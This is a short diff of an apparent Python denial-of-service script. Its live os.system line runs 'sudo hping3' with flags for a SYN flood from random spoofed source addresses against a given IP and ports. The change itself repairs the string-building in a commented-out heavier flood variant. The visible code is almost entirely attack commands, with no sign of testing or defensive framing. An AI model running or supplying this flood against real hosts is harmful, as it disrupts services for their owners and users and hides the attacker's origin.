@@ -68,6 +68,6 @@ print('------------------------------------------------------------')
 
 # command_SCAN = os.system('sudo hping3 --scan',PORTS,IP,'-S --rand-source -V')
 command_ATK = os.system('sudo hping3 -S --rand-source --flood -V -p '+ PORTS+" -d 120 "+ IP)
-# command_ATK2 = os.system('sudo hping3 -c 100000 -d 10000 -S -p',PORTS,'--flood --rand-source',IP)
+# command_ATK2 = os.system('sudo hping3 -c 100000 -d 10000 -S -p '+ PORTS + ' --flood --rand-source '+ IP)
 
 # command = print('sudo hping3 -S --rand-source --flood -V -p', PORTS,"-d 120", IP)
